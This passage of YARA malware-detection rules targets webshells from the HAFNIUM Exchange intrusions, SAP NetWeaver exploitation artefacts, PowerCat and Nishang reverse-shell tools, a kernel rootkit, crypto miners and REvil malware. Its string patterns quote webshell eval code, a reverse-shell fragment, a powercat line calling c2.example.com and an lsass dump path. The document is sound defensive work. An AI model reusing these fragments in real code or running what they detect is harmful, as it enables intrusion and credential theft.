		uint32be( 0 ) == 0x7f454c46 and filesize < 4MB and $op1
}
rule SIGNATURE_BASE_APT_SAP_Netweaver_Exploitation_Activity_Apr25_1 : SCRIPT CVE_2025_31324 FILE
{
	meta:
		description = "Detects forensic artefacts related to exploitation activity of SAP NetWeaver CVE-2025-31324"
		author = "Florian Roth"
		id = "1ad16960-f059-57cd-97ba-58f2be6ca3f8"
		date = "2025-04-25"
		modified = "2026-05-15"
		reference = "https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_sap_netweaver_apr25.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "ab6c5e17bba15a3f968bdbe88a8cf4a039c55b6035d91fd3c6b30092be89af5c"
		score = 70
		quality = 85
		tags = "SCRIPT, CVE-2025-31324, FILE"

	strings:
		$x01 = "/helper.jsp?cmd=" ascii wide
		$x02 = "/cache.jsp?cmd=" ascii wide

	condition:
		filesize < 20MB and 1 of them
}
rule SIGNATURE_BASE_APT_SAP_Netweaver_Exploitation_Activity_Apr25_2 : SCRIPT CVE_2025_31324 FILE
{
	meta:
		description = "Detects forensic artefacts related to exploitation activity of SAP NetWeaver CVE-2025-31324"
		author = "Florian Roth"
		id = "3b7d3f94-88a9-5686-8a23-ac4040c0e6c1"
		date = "2025-04-25"
		modified = "2026-05-15"
		reference = "https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_sap_netweaver_apr25.yar#L17-L29"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "dfc24a4f359e2bc899ab3924bd342c2c6bd8c757b7c1d3859a47f61b9e4039a9"
		score = 70
		quality = 85
		tags = "SCRIPT, CVE-2025-31324, FILE"

	strings:
		$x03 = "MSBuild.exe c:\\programdata\\" ascii wide

	condition:
		filesize < 20MB and 1 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Embedded_Mar21_1 : FILE
{
	meta:
		description = "Detects ASP webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "7cf7db9d-8f8a-51db-a0e6-84748e8f9e1f"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4a8b4cea6f53dad9771cb694ec55f305f04dfdbd8e663154cad672ca414c138c"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "<script runat=\"server\">" nocase
		$s2 = "new System.IO.StreamWriter(Request.Form["
		$s3 = ".Write(Request.Form["

	condition:
		filesize < 100KB and all of them
}
rule SIGNATURE_BASE_APT_WEBSHELL_HAFNIUM_Secchecker_Mar21_1 : FILE
{
	meta:
		description = "Detects HAFNIUM SecChecker webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "73db3d78-7ece-53be-9efb-d19801993d5e"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://twitter.com/markus_neis/status/1367794681237667840"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L18-L33"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0"
		logic_hash = "e0e4df860bdde7d5c277f596535c493d926095be6f46f6ba41b6177afbfc5cd9"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "<%if(System.IO.File.Exists(\"c:\\\\program files (x86)\\\\fireeye\\\\xagt.exe" ascii
		$x2 = "\\csfalconservice.exe\")){Response.Write( \"3\");}%></head>" ascii fullword

	condition:
		uint16( 0 ) == 0x253c and filesize < 1KB and 1 of them or 2 of them
}
rule SIGNATURE_BASE_APT_HAFNIUM_Forensic_Artefacts_Mar21_1
{
	meta:
		description = "Detects forensic artefacts found in HAFNIUM intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "872822b0-34d9-5ae4-a532-6a8786494fa9"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L35-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "eb86595956092506c2e29373faaf39a3987f9feed36a53b191bedd498db05cbb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
		$s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
		$s3 = "powercat.ps1'); powercat -c" ascii wide fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_APT_WEBSHELL_HAFNIUM_Chopper_Webshell : APT HAFNIUM WEBSHELL FILE
{
	meta:
		description = "Detects Chopper WebShell Injection Variant (not only Hafnium related)"
		author = "Markus Neis,Swisscom"
		id = "25dcf166-4aea-5680-b161-c5fc8d74b987"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L50-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c185a8da2a18fa59a8eeb36dbd95ba12c9c61717efc5f2d19d2d5b27ee243f2b"
		score = 75
		quality = 85
		tags = "APT, HAFNIUM, WEBSHELL, FILE"

	strings:
		$x1 = "runat=\"server\">" nocase
		$s1 = "<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request" nocase
		$s2 = "protected void Page_Load(object sender, EventArgs e){System.IO.StreamWriter sw = new System.IO.StreamWriter(Request.Form[\"p\"] , false, Encoding.Default);sw.Write(Request.Form[\"f\"]);"
		$s3 = "<script language=\"JScript\" runat=\"server\"> function Page_Load(){eval (Request[\"" nocase

	condition:
		filesize < 10KB and $x1 and 1 of ( $s* )
}
rule SIGNATURE_BASE_APT_WEBSHELL_Tiny_Webshell : APT HAFNIUM WEBSHELL FILE
{
	meta:
		description = "Detects WebShell Injection"
		author = "Markus Neis,Swisscom"
		id = "aa2fcecc-4c8b-570d-a81a-5dfb16c04e05"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L67-L82"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "099c8625c58b315b6c11f5baeb859f4c"
		logic_hash = "9309f9b57353b6fe292048d00794699a8637a3e6e429c562fb36c7e459003a3b"
		score = 75
		quality = 85
		tags = "APT, HAFNIUM, WEBSHELL, FILE"

	strings:
		$x1 = "<%@ Page Language=\"Jscript\" Debug=true%>"
		$s1 = "=Request.Form(\""
		$s2 = "eval("

	condition:
		filesize < 300 and all of ( $s* ) and $x1
}
rule SIGNATURE_BASE_HKTL_PS1_Powercat_Mar21 : FILE
{
	meta:
		description = "Detects PowerCat hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "ae3963e8-2fe9-5bc3-bf72-95f136622832"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://github.com/besimorhino/powercat"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L84-L103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"
		logic_hash = "cbd5c6f7c5b4ed713482588ee4490a2326fe11cfaacfb3bfc6a6d94130a8bc83"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
		$x2 = "try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}" ascii fullword
		$s1 = "Returning Encoded Payload..." ascii
		$s2 = "$CommandToExecute =" ascii fullword
		$s3 = "[alias(\"Execute\")][string]$e=\"\"," ascii

	condition:
		uint16( 0 ) == 0x7566 and filesize < 200KB and 1 of ( $x* ) or 3 of them
}
rule SIGNATURE_BASE_HKTL_Nishang_PS1_Invoke_Powershelltcponeline
{
	meta:
		description = "Detects PowerShell Oneliner in Nishang's repository"
		author = "Florian Roth (Nextron Systems)"
		id = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
		date = "2021-03-03"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L105-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"
		logic_hash = "59622bff95de1077d26ee4547f37cd1045c0c1fc6817df40ff2564b33a962a07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
		$s2 = ".GetStream();[byte[]]$" ascii wide
		$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide

	condition:
		all of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Simpleseesharp : WEBSHELL UNCLASSIFIED FILE
{
	meta:
		description = "A simple ASPX Webshell that allows an attacker to write further files to disk."
		author = "threatintel@volexity.com"
		id = "469fdf5c-e09e-5d44-a2e6-0864dcd0e18a"
		date = "2021-03-01"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L121-L136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "893cd3583b49cb706b3e55ecb2ed0757b977a21f5c72e041392d1256f31166e2"
		logic_hash = "6f62249a68bae94e5cbdb4319ea5cde9dc071ec7a4760df3aafe78bc1e072c30"
		score = 75
		quality = 85
		tags = "WEBSHELL, UNCLASSIFIED, FILE"

	strings:
		$header = "<%@ Page Language=\"C#\" %>"
		$body = "<% HttpPostedFile thisFile = Request.Files[0];thisFile.SaveAs(Path.Combine"

	condition:
		$header at 0 and $body and filesize < 1KB
}
rule SIGNATURE_BASE_APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_3 : FILE
{
	meta:
		description = "Detects HAFNIUM ASPX files dropped on compromised servers"
		author = "Florian Roth (Nextron Systems)"
		id = "9c2ba123-63c4-5e9c-a08f-bd9db3304691"
		date = "2021-03-07"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L202-L216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "391b366d78c2f24dc006a5365ec232a9a3c2fe0ea514b18897701ceeffcc81ca"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "runat=\"server\">void Page_Load(object" ascii wide
		$s2 = "Request.Files[0].SaveAs(Server.MapPath(" ascii wide

	condition:
		filesize < 50KB and all of them
}
rule SIGNATURE_BASE_APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_4 : FILE
{
	meta:
		description = "Detects HAFNIUM ASPX files dropped on compromised servers"
		author = "Florian Roth (Nextron Systems)"
		id = "93f5b682-642d-5edf-84a9-296bf12cd72b"
		date = "2021-03-07"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L218-L233"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "933ab74a0e30e2a728444d491c9eb0ff134db05d905aeb48efe3ba65674a3730"
		score = 85
		quality = 79
		tags = "FILE"

	strings:
		$s1 = "<%@Page Language=\"Jscript\"%>" ascii wide nocase
		$s2 = ".FromBase64String(" ascii wide nocase
		$s3 = "eval(System.Text.Encoding." ascii wide nocase

	condition:
		filesize < 850 and all of them
}
rule SIGNATURE_BASE_APT_HAFNIUM_Forensicartefacts_Cab_Recon_Mar21_1 : FILE
{
	meta:
		description = "Detects suspicious CAB files used by HAFNIUM for recon activity"
		author = "Florian Roth (Nextron Systems)"
		id = "b0caf9d9-af0a-5181-85e4-6091cd6699e3"
		date = "2021-03-11"
		modified = "2023-12-05"
		reference = "https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3?u=dstepanic"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L252-L273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "de3acb2d01ad14d73263af9e62ef7c715cde259e3f2fbbcbbb41d55589c3f0ab"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "ip.txt" ascii fullword
		$s2 = "arp.txt" ascii fullword
		$s3 = "system" ascii fullword
		$s4 = "security" ascii fullword

	condition:
		uint32( 0 ) == 0x4643534d and filesize < 10000KB and ( $s1 in ( 0 .. 200 ) and $s2 in ( 0 .. 200 ) and $s3 in ( 0 .. 200 ) and $s4 in ( 0 .. 200 ) )
}
rule SIGNATURE_BASE_WEBSHELL_Compiled_Webshell_Mar2021_1 : FILE
{
	meta:
		description = "Triggers on temporary pe files containing strings commonly used in webshells."
		author = "Bundesamt fuer Sicherheit in der Informationstechnik"
		id = "9336bd2c-791c-5c3e-9733-724a6a23864a"
		date = "2021-03-05"
		modified = "2021-03-12"
		reference = "https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/Vorfaelle/Exchange-Schwachstellen-2021/MSExchange_Schwachstelle_Detektion_Reaktion.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L275-L295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d2e5f91f7bb50984c491eb9632d3863febc986760e4d03c8255872887ce4dc4a"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$x1 = /App_Web_[a-zA-Z0-9]{7,8}.dll/ ascii wide fullword
		$a1 = "~/aspnet_client/" ascii wide nocase
		$a2 = "~/auth/" ascii wide nocase
		$b1 = "JScriptEvaluate" ascii wide fullword
		$c1 = "get_Request" ascii wide fullword
		$c2 = "get_Files" ascii wide fullword
		$c3 = "get_Count" ascii wide fullword
		$c4 = "get_Item" ascii wide fullword
		$c5 = "get_Server" ascii wide fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize > 5KB and filesize < 40KB and all of ( $x* ) and 1 of ( $a* ) and ( all of ( $b* ) or all of ( $c* ) )
}
rule SIGNATURE_BASE_APT_MAL_ASP_DLL_HAFNIUM_Mar21_1 : FILE
{
	meta:
		description = "Detects HAFNIUM compiled ASP.NET DLLs dropped on compromised servers"
		author = "Florian Roth (Nextron Systems)"
		id = "68b8252e-a07d-5507-b556-a4d473f98157"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L297-L325"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "097f5f700c000a13b91855beb61a931d34fb0abb738a110368f525e25c5bc738"
		hash = "15744e767cbaa9b37ff7bb5c036dda9b653fc54fc9a96fe73fbd639150b3daa3"
		hash = "52ae4de2e3f0ef7fe27c699cb60d41129a3acd4a62be60accc85d88c296e1ddb"
		hash = "5f0480035ee23a12302c88be10e54bf3adbcf271a4bb1106d4975a28234d3af8"
		hash = "6243fd2826c528ee329599153355fd00153dee611ca33ec17effcf00205a6e4e"
		hash = "ebf6799bb86f0da2b05e66a0fe5a9b42df6dac848f4b951b2ed7b7a4866f19ef"
		logic_hash = "a4a3f9c7029e67647823a13079655b24648f5e4a7e238439b7a933b19477c20c"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Page_Load" ascii fullword
		$sc1 = { 20 00 3A 00 20 00 68 00 74 00 74 00 70 00 3A 00
               2F 00 2F 00 (66|67) 00 2F 00 00 89 A3 0D 00 0A 00 }
		$op1 = { 00 43 00 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f }
		$op2 = { 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f 00 61 00 }
		$op3 = { 01 0e 0e 05 20 01 01 11 79 04 07 01 12 2d 04 07 01 12 31 02 }
		$op4 = { 5e 00 03 00 bc 22 00 00 00 00 01 00 85 03 2b 00 03 00 cc }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 50KB and all of ( $s* ) or all of ( $op* )
}
rule SIGNATURE_BASE_WEBSHELL_HAFNIUM_CISA_10328929_01 : TROJAN WEBSHELL EXPLOIT CVE_2021_27065
{
	meta:
		description = "Detects CVE-2021-27065 Webshellz"
		author = "CISA Code & Media Analysis"
		id = "81916396-8aaa-5045-b31c-4bcce8d295a5"
		date = "2021-03-17"
		modified = "2023-12-05"
		reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L328-L344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
		logic_hash = "ad5a41df97e77d7f7908354b009633e2d1e32397994be2b4af04f90471f35b01"
		score = 75
		quality = 83
		tags = "TROJAN, WEBSHELL, EXPLOIT, CVE_2021_27065, CVE-2021-27065"

	strings:
		$s0 = { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 [1-32] 5D 2C 22 75 6E 73 61 66 65 22 29 }
		$s1 = { 65 76 61 6C 28 }
		$s2 = { 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-36] 5D 29 29 2C 22 75 6E 73 61 66 65 22 29 }
		$s3 = { 49 4F 2E 53 74 72 65 61 6D 57 72 69 74 65 72 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D }
		$s4 = { 57 72 69 74 65 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D }

	condition:
		$s0 or ( $s1 and $s2 ) or ( $s3 and $s4 )
}
rule SIGNATURE_BASE_WEBSHELL_HAFNIUM_CISA_10328929_02 : TROJAN WEBSHELL EXPLOIT CVE_2021_27065
{
	meta:
		description = "Detects CVE-2021-27065 Exchange OAB VD MOD"
		author = "CISA Code & Media Analysis"
		id = "34a89a6e-fa8a-5c64-a325-30202e20b30f"
		date = "2021-03-17"
		modified = "2023-12-05"
		reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L346-L360"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
		logic_hash = "f4ca6e2a9b563a2d2b73b4b3eb9e1e231e945e41a3d08c3171713e9ba570be9c"
		score = 75
		quality = 81
		tags = "TROJAN, WEBSHELL, EXPLOIT, CVE_2021_27065, CVE-2021-27065"

	strings:
		$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }
		$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }
		$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }

	condition:
		$s0 and $s1 and $s2
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Fileexplorer_Mar21_1 : FILE
{
	meta:
		description = "Detects Chopper like ASPX Webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "edcaa2a8-6fea-584e-90c2-307a2dfc9f7f"
		date = "2021-03-31"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L363-L397"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
		logic_hash = "7b4ffd222b38e76455fff2650b72bdcaff281323103f342b427013cd3fffdc21"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "<span style=\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\" onclick=" ascii
		$xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64
               20 72 75 6E 61 74 3D 22 73 65 72 76 65 72 22 20
               49 44 3D 22 ?? ?? ?? ?? ?? 22 20 2F 3E 3C 62 72
               20 2F 3E 3C 62 72 20 2F 3E 20 50 72 6F 63 65 73
               73 20 4E 61 6D 65 3A 3C 61 73 70 3A 54 65 78 74
               42 6F 78 20 49 44 3D }
		$xc2 = { 22 3E 43 6F 6D 6D 61 6E 64 3C 2F 6C 61 62 65 6C
               3E 3C 69 6E 70 75 74 20 69 64 3D 22 ?? ?? ?? ??
               ?? 22 20 74 79 70 65 3D 22 72 61 64 69 6F 22 20
               6E 61 6D 65 3D 22 74 61 62 73 22 3E 3C 6C 61 62
               65 6C 20 66 6F 72 3D 22 ?? ?? ?? ?? ?? 22 3E 46
               69 6C 65 20 45 78 70 6C 6F 72 65 72 3C 2F 6C 61
               62 65 6C 3E 3C 25 2D 2D }
		$r1 = "(Request.Form[" ascii
		$s1 = ".Text + \" Created!\";" ascii
		$s2 = "DriveInfo.GetDrives()" ascii
		$s3 = "Encoding.UTF8.GetString(FromBase64String(str.Replace(" ascii
		$s4 = "encodeURIComponent(btoa(String.fromCharCode.apply(null, new Uint8Array(bytes))));;"

	condition:
		uint16( 0 ) == 0x253c and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Chopper_Like_Mar21_1 : FILE
{
	meta:
		description = "Detects Chopper like ASPX Webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "a4dc1880-865f-5e20-89a2-3a642c453ef9"
		date = "2021-03-31"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_hafnium.yar#L399-L416"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90"
		logic_hash = "baa9eb1e3c4ac5ce49d27b1c3f75c8b6590567e25d98761a8b704478f2cee970"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "http://f/<script language=\"JScript\" runat=\"server\">var _0x" ascii
		$s2 = "));function Page_Load(){var _0x" ascii
		$s3 = ";eval(Request[_0x" ascii
		$s4 = "','orange','unsafe','" ascii

	condition:
		filesize < 3KB and 1 of them or 2 of them
}
rule SIGNATURE_BASE_MAL_Kernel_Regphantom_Mar26 : FILE
{
	meta:
		description = "Detects RegPhantom, a kernel-mode rootkit that allow attacker to inject arbitrary code from unprivileged user-mode into kernel-mode and execute it."
		author = "Pezier Pierre-Henri (Nextron Systems)"
		id = "aa8963b5-3053-52a4-a84f-2fc02d03275e"
		date = "2026-03-19"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_kernel_regphantom_mar26.yar#L1-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "006e08f1b8cad821f7849c282dc11d317e76ce66a5bcd84053dd5e7752e0606f"
		logic_hash = "53dead8b4cd4f0139249940fbf2767a5411aef73e1919279ef66243fe009bb27"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "CmRegisterCallback" fullword
		$s2 = "PsSetCreateThreadNotifyRoutine" fullword
		$o1 = {
         // xor decrypt
         48 8b 09     // mov     rcx, [rcx]
         0f b6 14 08  // movzx   edx, byte ptr [rax+rcx]
         4c 31 c2     // xor     rdx, r8
         88 14 08     // mov     [rax+rcx], dl
      }
		$o2 = {
         // Command selector
         c6 01 01     // mov     byte ptr [rcx], 1
         48 83 38 77  // cmp     qword ptr [rax], 77h
         0f 94 c0     // setz    al
         24 01        // and     al, 1
      }

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule SIGNATURE_BASE_PUA_Crypto_Mining_Commandline_Indicators_Oct21 : SCRIPT FILE
{
	meta:
		description = "Detects command line parameters often used by crypto mining software"
		author = "Florian Roth (Nextron Systems)"
		id = "afe5a63a-08c3-5cb7-b4b1-b996068124b7"
		date = "2021-10-24"
		modified = "2023-12-05"
		reference = "https://www.poolwatch.io/coin/monero"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/pua_cryptocoin_miner.yar#L54-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "7ae1a77d8ff02ec539ce2b8be668530c3f509f0c408dfa7f2b749b0a4d6f45b7"
		score = 65
		quality = 85
		tags = "SCRIPT, FILE"

	strings:
		$s01 = " --cpu-priority="
		$s02 = "--donate-level=0"
		$s03 = " -o pool."
		$s04 = " -o stratum+tcp://"
		$s05 = " --nicehash"
		$s06 = " --algo=rx/0 "
		$se1 = "LS1kb25hdGUtbGV2ZWw9"
		$se2 = "0tZG9uYXRlLWxldmVsP"
		$se3 = "tLWRvbmF0ZS1sZXZlbD"
		$se4 = "c3RyYXR1bSt0Y3A6Ly"
		$se5 = "N0cmF0dW0rdGNwOi8v"
		$se6 = "zdHJhdHVtK3RjcDovL"
		$se7 = "c3RyYXR1bSt1ZHA6Ly"
		$se8 = "N0cmF0dW0rdWRwOi8v"
		$se9 = "zdHJhdHVtK3VkcDovL"

	condition:
		filesize < 5000KB and 1 of them
}

rule SIGNATURE_BASE_APT_MAL_Revil_Kaseya_Jul21_1 : FILE
{
	meta:
		description = "Detects malware used in the Kaseya supply chain attack"
		author = "Florian Roth (Nextron Systems)"
		id = "7356f4ea-183f-52ec-a167-fc16b8bfb55a"
		date = "2021-07-02"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_revil_general.yar#L3-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "1fe9b489c25bb23b04d9996e8107671edee69bd6f6def2fe7ece38a0fb35f98e"
		hash = "aae6e388e774180bc3eb96dad5d5bfefd63d0eb7124d68b6991701936801f1c7"
		hash = "dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25b667ddeca7623a95cd21411f"
		hash = "df2d6ef0450660aaae62c429610b964949812df2da1c57646fc29aa51c3f031e"
		logic_hash = "a7f9fa8f8e8a3a25728aa6a334924e0b4075f3422df6b92a2f544bb0ebb6bfad"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Mpsvc.dll" wide fullword
		$s2 = ":0:4:8:<:@:D:H:L:P:T:X:\\:`:d:h:l:p:t:x:H<L<P<\\<`<" ascii fullword
		$op1 = { 40 87 01 c3 6a 08 68 f8 0e 41 00 e8 ae db ff ff be 80 25 41 00 39 35 ?? 32 41 00 }
